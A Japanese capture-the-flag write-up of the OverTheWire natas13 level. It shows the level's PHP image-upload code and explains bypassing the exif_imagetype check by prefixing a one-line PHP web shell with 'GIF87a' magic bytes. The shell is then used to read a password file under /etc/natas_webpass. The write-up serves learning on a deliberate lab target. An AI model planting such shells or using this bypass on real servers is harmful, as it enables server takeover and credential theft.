![](img/natas13-1.png)  

natas12と同じようなページ  

ソースコードを見てみる。  

```
 <html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas13", "pass": "<censored>" };</script></head>
<body>
<h1>natas13</h1>
<div id="content">
For security reasons, we now only accept image files!<br/><br/>

<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


natas12では、ファイルサイズをチェックしていたがファイル形式をチェックしていないことが原因で任意ファイルをアップロードできてしまう  
というのを利用して問題を解いた。  
natas13では、`} else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {`のようにファイル形式が画像かどうかを  
チェックする処理が追加されている。  

exif_imagetype関数は" exif_imagetype() を画像の先頭バイトを読み そのサインを調べます。 "とPHPマニュアルで説明されている。  

例えばgif(87a)ファイルのファイルヘッダは16進数で"47 49 46 38 37 61"、  
ASCII表記で"GIF87a"であり、  
pngファイルだと"89 50 4E 47 0D 0A 1A 0A"の".PNG...."である。  

exif_imagetype関数はファイルヘッダしかチェックしないので先頭だけ変えた悪意のあるファイルをアップロードしたらOK（かも）  

今回はASCII表記で入力しやすいGIF形式のファイルで行う。  

前回の`<?php system($_GET["cmd"]);?>`に"GIF87a"を上の行に追加した以下のようなファイルを作成し、前回と同じやり方でアップロードを行う。  
```
GIF87a
<?php system($_GET["cmd"]);?>
```

クエリのパラメータから好きなコマンドを実行できるので`/etc/natas_webpass/natas14`をcatしてクリア
